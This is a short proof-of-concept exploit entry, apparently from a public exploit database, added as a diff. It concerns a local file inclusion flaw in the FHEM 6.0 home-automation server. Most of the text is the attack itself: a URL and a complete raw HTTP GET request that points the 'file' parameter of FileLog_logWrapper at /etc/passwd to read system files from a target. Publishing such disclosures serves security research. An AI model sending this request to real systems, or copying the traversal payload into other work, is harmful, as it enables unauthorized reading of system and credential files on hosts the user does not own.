@@ -1,0 +1,26 @@
+# Exploit Title: FHEM 6.0 - Local File Inclusion
+# Date: 2020-02-10
+# Exploit Author: Emre ÖVÜNÇ
+# Vendor Homepage: https://fhem.de/
+# Software Link: https://fhem.de/#Download
+# Version: v6.0
+# Tested on: Windows
+# Link: https://github.com/EmreOvunc/FHEM-6.0-Local-File-Inclusion-LFI-Vulnerability
+
+# PoC
+
+To exploit vulnerability, someone could use 'http://
+[HOST]/fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text'
+request
+to get some informations from the target by changing "file" parameter.
+
+GET /fhem/FileLog_logWrapper?dev=Logfile&file=%2fetc%2fpasswd&type=text HTTP/1.1
+Host: [TARGET]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0)
+Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
